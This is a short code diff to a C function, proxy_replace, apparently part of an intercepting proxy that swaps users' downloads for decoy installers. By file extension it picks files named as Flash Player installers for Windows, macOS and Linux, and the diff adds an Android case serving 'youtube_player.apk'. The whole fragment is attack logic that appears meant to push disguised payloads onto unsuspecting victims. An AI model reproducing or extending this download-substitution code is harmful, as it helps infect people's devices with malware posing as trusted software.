@@ -136,6 +136,8 @@ int proxy_replace(BIO **cbio, BIO **sbio, char *file,  char *tag, int type, char
           thefile = "install_flash_player.exe";
        else if (strstr(file, ".dmg") != NULL)
           thefile = "install_flash_player_osx.dmg";
+       else if (strstr(file, ".apk") != NULL)
+	  thefile = "youtube_player.apk";
        else
           thefile = "flash-plugin-11.2.deb";
 
